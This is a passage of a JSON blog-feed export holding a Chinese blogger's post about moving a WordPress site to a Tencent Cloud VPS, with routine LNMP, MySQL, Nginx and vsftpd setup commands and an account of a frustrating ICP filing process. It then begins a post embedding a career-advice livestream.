+0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_2.png","linkMd5":"9f899cfca3c5a170616710d03b1c84f4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn19@2020_2/2020/08/24/15-45-04-609_30acb39babbb7560.webp","destWidth":458,"destHeight":447,"sourceBytes":19103,"destBytes":6706,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_2.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn19@2020_2/2020/08/24/15-45-04-609_30acb39babbb7560.webp","https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_3.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn63@2020_5/2020/08/24/15-45-10-119_2d97d5ee8cae1dff.webp","https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_5.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn47@2020_4/2020/08/24/15-45-11-404_3e0f07b5cc3b3d5f.webp","https://www.raychase.net/wp-content/uploads/2020/08/image.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn43@2020_6/2020/08/24/15-45-11-436_7c875119feff755f.webp","https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_4.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn60@2020_3/2020/08/24/15-45-10-286_d9b2130d2398003f.webp","https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_7.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2020/08/24/15-45-11-613_f8ba2dadb11bd8bf.webp"},"publishedOrCreatedDate":1598283901922},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"VPS 迁移和网站备案","link":"https://www.raychase.net/?p=5790","description":"<div class=\"wp-block-group\">\n <div class=\"wp-block-group__inner-container\"> \n  <p>以前这个 Blog 放在 VPSYOU 上，主机在美国加州，但是这个 VPS 由于亏损的关系，要关掉了，于是我开始寻找下一个 VPS 服务。考虑到是中文的博客，因此我倾向于把主机放到中国大陆，这样访问速度会快一些。正好腾讯云在搞活动，我就订购了，找了上海的主机，其实我隐约知道国内的 VPS 建立网站，是需要备案的，但我觉得可以尝试一下。<span style=\"color: #0000ff;\">如我所料，这个 Blog 应用迁移的过程很顺利；可是没想到的是，我大大低估了备案的难度，这个备案的过程，实在太过荒谬和不近人情。</span></p> \n  <h3>Blog 应用迁移</h3> \n  <p>整体来说，应用迁移过程本身还是比较顺利的。这里记录了迁移这个过程的操作步骤，也可以作为日后再做 VPS 迁移的参考。</p> \n  <h4>安装 LNMP</h4> \n  <p>首先，VPS 申请下来以后，<a href=\"https://lnmp.org/install.html\" target=\"_blank\" rel=\"noopener noreferrer\">安装 LNMP</a>，这个过程要花费几十分钟时间。</p> \n  <div> \n   <div id=\"highlighter_509964\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">wget http:</code>\n          <code class=\"shell plain\">//soft</code>\n          <code class=\"shell plain\">.vpser.net</code>\n          <code class=\"shell plain\">/lnmp/lnmp1</code>\n          <code class=\"shell plain\">.6.</code>\n          <code class=\"shell functions\">tar</code>\n          <code class=\"shell plain\">.gz -cO lnmp1.6.</code>\n          <code class=\"shell functions\">tar</code>\n          <code class=\"shell plain\">.gz &amp;&amp; </code>\n          <code class=\"shell functions\">tar</code> \n          <code class=\"shell plain\">zxf lnmp1.6.</code>\n          <code class=\"shell functions\">tar</code>\n          <code class=\"shell plain\">.gz &amp;&amp; </code>\n          <code class=\"shell functions\">cd</code> \n          <code class=\"shell plain\">lnmp1.6 &amp;&amp; .</code>\n          <code class=\"shell plain\">/install</code>\n          <code class=\"shell plain\">.sh&nbsp;lnmp</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <h4>转移 Blog 应用文件夹</h4> \n  <p>Blog 资源压缩成 tar.gz 包：</p> \n  <div> \n   <div id=\"highlighter_620139\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell functions\">tar</code> \n          <code class=\"shell plain\">-zcvf www.raychase.net.</code>\n          <code class=\"shell functions\">tar</code>\n          <code class=\"shell plain\">.gz </code>\n          <code class=\"shell plain\">/home/www</code>\n          <code class=\"shell plain\">.raychase.net/</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>解压缩到新的 VPS 下：</p> \n  <div> \n   <div id=\"highlighter_15063\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell functions\">tar</code> \n          <code class=\"shell plain\">-xvf www.raychase.net.</code>\n          <code class=\"shell functions\">tar</code>\n          <code class=\"shell plain\">.gz</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <h4>数据库迁移</h4> \n  <p>在 phpmyadmin 下，导出 WordPress 数据库内的数据，在新环境下新建 WordPress 数据库，并导入数据库数据文件，由于 dump 文件大于 50M，需要上传到如下路径并执行导入：</p> \n  <div> \n   <div id=\"highlighter_95623\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">/home/wwwroot/default/phpmyadmin/upload</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>如果还有问题，可以手动执行 mysql 导入：</p> \n  <div> \n   <div id=\"highlighter_992321\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">mysql -u root -p wordpress &lt; wordpress.sql</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>如果遇到 “MySql server has gone away” 这样的错误，需要增大超时时间，编辑/etc/my.cnf，修改如下两项：</p> \n  <div> \n   <div id=\"highlighter_955980\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> \n        <div class=\"line number2 index1 alt1\">\n         2\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">max_allowed_packet</code>\n         </div> \n         <div class=\"line number2 index1 alt1\">\n          <code class=\"shell plain\">wait_timeout</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>当然还需要重启 Mysql：</p> \n  <div> \n   <div id=\"highlighter_559527\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">lnmp mysql restart</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>导入完成后，检查每一张表的行数，如果一致则认为导入成功。</p> \n  <p>重启 LNMP：</p> \n  <div> \n   <div id=\"highlighter_960533\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">lnmp restart</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <h4>配置 Nginx</h4> \n  <p>默认的 Nginx 配置文件/usr/local/nginx/conf/nginx.conf 需要至少修改两处。</p> \n  <p>一处是 root 目录配置：</p> \n  <div> \n   <div id=\"highlighter_827868\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">root </code>\n          <code class=\"shell plain\">/home/www</code>\n          <code class=\"shell plain\">.raychase.net;</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>另一处，则是需要建立 wordpress.conf，编辑：</p> \n  <div> \n   <div id=\"highlighter_880528\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> \n        <div class=\"line number2 index1 alt1\">\n         2\n        </div> \n        <div class=\"line number3 index2 alt2\">\n         3\n        </div> \n        <div class=\"line number4 index3 alt1\">\n         4\n        </div> \n        <div class=\"line number5 index4 alt2\">\n         5\n        </div> \n        <div class=\"line number6 index5 alt1\">\n         6\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">location / {</code>\n         </div> \n         <div class=\"line number2 index1 alt1\">\n          <code class=\"shell spaces\">&nbsp;&nbsp;&nbsp; </code>\n          <code class=\"shell plain\">try_files $uri $uri/ </code>\n          <code class=\"shell plain\">/index</code>\n          <code class=\"shell plain\">.php?$args;</code>\n         </div> \n         <div class=\"line number3 index2 alt2\">\n          <code class=\"shell plain\">}</code>\n         </div> \n         <div class=\"line number4 index3 alt1\">\n          &nbsp;\n         </div> \n         <div class=\"line number5 index4 alt2\">\n          <code class=\"shell comments\"># Add trailing slash to */wp-admin requests.</code>\n         </div> \n         <div class=\"line number6 index5 alt1\">\n          <code class=\"shell plain\">rewrite </code>\n          <code class=\"shell plain\">/wp-admin</code>\n          <code class=\"shell plain\">$ $scheme:</code>\n          <code class=\"shell plain\">//</code>\n          <code class=\"shell plain\">$host$uri/ permanent;</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>并将其在 nginx.conf 中将它引入：</p> \n  <div> \n   <div id=\"highlighter_758100\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">include wordpress.conf;</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>全部完成以后重新加载 Nginx 配置文件：</p> \n  <div> \n   <div id=\"highlighter_947129\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">nginx -s reload</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <h4>配置域名解析</h4> \n  <p>配置域名解析为新的地址。</p> \n  <h4>配置 HTTPS 证书</h4> \n  <p>大致可以参照<a href=\"https://www.raychase.net/5318\" target=\"_blank\" rel=\"noopener noreferrer\">这个步骤</a>完成。有一个变化的地方在于，由于众所周知的原因，以往配置的使用 Gmail 发送邮件的功能需要重新设置了。</p> \n  <h4>安装 FTP</h4> \n  <div> \n   <div id=\"highlighter_273919\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">yum </code>\n          <code class=\"shell functions\">install</code> \n          <code class=\"shell plain\">vsftpd</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>编辑/etc/vsftpd/vsftpd.conf：</p> \n  <div> \n   <div id=\"highlighter_371033\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> \n        <div class=\"line number2 index1 alt1\">\n         2\n        </div> \n        <div class=\"line number3 index2 alt2\">\n         3\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">anonymous_enable=NO</code>\n         </div> \n         <div class=\"line number2 index1 alt1\">\n          <code class=\"shell plain\">local_enable=YES</code>\n         </div> \n         <div class=\"line number3 index2 alt2\">\n          <code class=\"shell plain\">write_enable=YES</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>注意到其中已有这样的配置：</p> \n  <div> \n   <div id=\"highlighter_935557\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> \n        <div class=\"line number2 index1 alt1\">\n         2\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">pam_service_name=vsftpd</code>\n         </div> \n         <div class=\"line number2 index1 alt1\">\n          <code class=\"shell plain\">userlist_enable=YES</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>编辑下列文件确保 ftp 用户不会被屏蔽：</p> \n  <div> \n   <div id=\"highlighter_400868\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> \n        <div class=\"line number2 index1 alt1\">\n         2\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">/etc/vsftpd/ftpusers</code>\n         </div> \n         <div class=\"line number2 index1 alt1\">\n          <code class=\"shell plain\">/etc/vsftpd/user_list</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <p>完毕以后，重启服务：</p> \n  <div> \n   <div id=\"highlighter_651970\" class=\"syntaxhighlighter  shell\"> \n    <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n     <tbody> \n      <tr> \n       <td class=\"gutter\"> \n        <div class=\"line number1 index0 alt2\">\n         1\n        </div> </td> \n       <td class=\"code\"> \n        <div class=\"container\"> \n         <div class=\"line number1 index0 alt2\">\n          <code class=\"shell plain\">service vsftpd restart</code>\n         </div> \n        </div> </td> \n      </tr> \n     </tbody> \n    </table> \n   </div> \n  </div> \n  <h4>安全加固</h4> [Update on 1/25/2020] 必要的安全加固还是要做的，参见\n  <a href=\"https://www.raychase.net/5808\" target=\"_blank\" rel=\"noopener noreferrer\">这里</a>。 \n  <h3>网站备案</h3> \n  <p>迁移完成之后，尝试了一下可以访问，我知道下一步是备案的过程。可是一开始，我并不着急，我总觉得这件事情可以慢慢来。</p> \n  <p>于是第二天就被打脸了，腾讯马上把 Blog 给封了：</p> \n  <p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146.png\"><img class=\"alignnone size-large wp-image-5798\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-1024x620.png\" alt=\"\" width=\"640\" height=\"388\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-1024x620.png 1024w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-300x182.png 300w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-768x465.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146.png 2006w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></a></p> \n  <p>无奈之下，我只好先切回原来的 VPS，并开始备案的流程，噩梦也就开始了。</p> \n  <h4>第一次提交备案请求</h4> \n  <p>这个过程在提示下，是在微信小程序上完成的。微信小程序做得易用性有一点问题，每点击一步都要等很久，还经常超时，需要重来，当然，这不算什么大问题。备案的材料也不算特别难准备，不过确实需要把自己的 “底细” 交代得清清楚楚，期间不但要拍照记录，还要视频识别。</p> \n  <p>提交上去以后，腾讯云的工作人员开始审核，工作效率很高，但是给我打电话，给我提了两个要求：</p> \n  <ol> \n   <li>需要提交域名证书；</li> \n   <li>要求我网站改名，因为 “四火的唠叨” 不够直白，不能体现网站的内容。</li> \n  </ol> \n  <p>这第一个要求挺合理，但是第二个，我当时就不太乐意，我觉得这个 blog 的标题用了很长时间了，改标题意味着太多，不能改。所以我说，这个标题不能改，有被驳回的风险我自己承担。</p> \n  <h4>第二次提交备案请求</h4> \n  <p>于是我第二次提交备案请求，补足了缺失的材料，满心期望这一次可以顺利通过。</p> \n  <p>几天后，又被驳回了，这次的理由是，视频拍得不合格……</p> \n  <p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13.png\"><img class=\"alignnone size-large wp-image-5799\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-1024x362.png\" alt=\"\" width=\"640\" height=\"226\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-1024x362.png 1024w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-300x106.png 300w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-768x271.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13.png 1308w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></a></p> \n  <p>当时立马就有点打退堂鼓了，这搞得像是拍婚纱照似的。不过我还是耐着性子尝试了几次，完成并重新提交了请求。</p> \n  <h4>审核通过，等待提交管局</h4> \n  <p>腾讯云的工作人员很快完成了审核，但是卡在 “等待提交管局” 好长时间。</p> \n  <p>原因是 “接口升级”，而且也不知道什么时候这个 “升级” 能完成：</p> \n  <p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15.png\"><img class=\"alignnone wp-image-5800 \" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-752x1024.png\" alt=\"\" width=\"442\" height=\"602\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-752x1024.png 752w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-220x300.png 220w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-768x1045.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15.png 820w\" sizes=\"(max-width: 442px) 100vw, 442px\" /></a></p> \n  <p>无论是哪边的原因，显然这是让用户买单非用户的问题。</p> \n  <p>我再提了工单去询问，一番对话下来，也没有得到一个明确的日期。</p> \n  <h4>提交管局前，要求关站</h4> \n  <p>几天后，终于收到通知，这个备案请求可以提交管局了，可是腾讯云的工作人员强调说，这个网站必须关闭，等待审核过程完成才能重开，这个审核过程一般在十余个工作日左右完成，但可能延长至二十个工作日。</p> \n  <p>什么？这么重要的信息，怎么不早说？</p> \n  <p>只要不是新站，关站是一件很麻烦的事情，也是很不合情理的，虽然这只是一个人的 blog，但是这几年来，我也是认真维护的。这太过荒唐了，对于一个已经运行在中国大陆以外的站点，这直接就封杀了迁移回国内的门路了啊。</p> \n  <p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16.png\"><img class=\"alignnone size-large wp-image-5802\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-1024x360.png\" alt=\"\" width=\"640\" height=\"225\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-1024x360.png 1024w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-300x105.png 300w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-768x270.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16.png 1274w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></a></p> \n  <p>好吧，我拒绝了这个要求，备案的请求也被驳回了。</p> \n  <p>于是，我花费的这些时间精力，就这样打了水漂。</p> \n  <p>我不得已在另外一个 VPS 运营商下，找了一台香港的 VPS，我想，就这样吧，以后就别考虑备案这事了。</p> \n </div>\n</div> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/5790\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/4620\" rel=\"bookmark\" title=\"Blog 安全问题小记\">Blog 安全问题小记 </a></li> \n  <li><a href=\"https://www.raychase.net/5318\" rel=\"bookmark\" title=\"HTTPS 升级\">HTTPS 升级 </a></li> \n  <li><a href=\"https://www.raychase.net/5808\" rel=\"bookmark\" title=\"Blog 被黑记录\">Blog 被黑记录 </a></li> \n  <li><a href=\"https://www.raychase.net/1504\" rel=\"bookmark\" title=\"寻找 Mac 平台上 Windows Live Writer 的替代品\">寻找 Mac 平台上 Windows Live Writer 的替代品 </a></li> \n  <li><a href=\"https://www.raychase.net/3715\" rel=\"bookmark\" title=\"副业？副业才有趣，才精彩\">副业？副业才有趣，才精彩 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Wed, 15 Jan 2020 05:06:06 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-1024x620.png","linkMd5":"857807cd77aa4ae6c474aa3a13952bc3","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn95@2020_5/2020/08/24/15-45-06-047_ede9257bb0433f30.webp","destWidth":1024,"destHeight":620,"sourceBytes":258316,"destBytes":23854,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-1024x620.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn95@2020_5/2020/08/24/15-45-06-047_ede9257bb0433f30.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-1024x362.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_4/2020/08/24/15-45-15-031_f3a4c05660cb98e9.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-752x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn96@2020_3/2020/08/24/15-45-20-885_8d908b68f789ea73.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-1024x360.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn100@2020_4/2020/08/24/15-45-12-168_0e8722acdec1e423.webp"},"publishedOrCreatedDate":1598283901929},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"直播：专精 or 博学，多少人输在了技术选择上？","link":"https://www.raychase.net/?p=6244","description":"\n<p>上个月在极客时间做了一场直播，聊了聊职业生涯技术选择的话题，我把编辑剪好的视频贴在下面（视频本身在 <a href=\"https://www.bilibili.com/video/BV12T4y157Z7\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"B站 (opens in a new tab)\">B 站</a>）。如果对于我写的极客时间专栏 <a href=\"http://gk.link/a/107V9\" target=\"_blank\" rel=\"noreferrer noopener\">《全栈工程师修炼指南》</a>感兴趣的话，也欢迎订阅。</p>\n\n\n\n<h4>胶片</h4>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a80b0\"  tabindex=\"0\" title=\"胶片\"    >胶片</span><div id=\"target-id5f43e195a80b0\" class=\"collapseomatic_content \">\t\t\n\t<iframe id=\"s_pdf_frame\" src=\"//docs.google.com/gview?embedded=true&url=https://www.raychase.net/wp-content/uploads/2020/08/PPT-四火-已去除营销信息.pptx\" style=\"float:left; padding:10px;width:100%; height:600px;\" frameborder=\"0\"></iframe></div>\n<p>&#160;</p>\n\n\n\n<h4>视频</h4>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8263\"  tabindex=\"0\" title=\"P1 我是谁\"    >P1 我是谁</span><div id=\"target-id5f43e195a8263\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223544292&#38;page=1\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8284\"  tabindex=\"0\" title=\"P2 第一部分：技术路线的选择\"    >P2 第一部分：技术路线的选择</span><div id=\"target-id5f43e195a8284\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223546993&#38;page=2\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8299\"  tabindex=\"0\" title=\"P3 技术路线选择：面临的困难\"    >P3 技术路线选择：面临的困难</span><div id=\"target-id5f43e195a8299\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223548208&#38;page=3\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a82c8\"  tabindex=\"0\" title=\"P4 技术路线选择：技术栈分级\"    >P4 技术路线选择：技术栈分级</span><div id=\"target-id5f43e195a82c8\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223548861&#38;page=4\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a82dc\"  tabindex=\"0\" title=\"P5 技术路线选择：学习的主次\"    >P5 技术路线选择：学习的主次</span><div id=\"target-id5f43e195a82dc\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223549989&#38;page=5\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a82ef\"  tabindex=\"0\" title=\"P6 技术路线选择：找到竞争力\"    >P6 技术路线选择：找到竞争力</span><div id=\"target-id5f43e195a82ef\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223552516&#38;page=6\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8301\"  tabindex=\"0\" title=\"P7 专题：北美大厂的招聘玩法\"    >P7 专题：北美大厂的招聘玩法</span><div id=\"target-id5f43e195a8301\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223552981&#38;page=7\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8313\"  tabindex=\"0\" title=\"P8 专题：程序员怎么学英语\"    >P8 专题：程序员怎么学英语</span><div 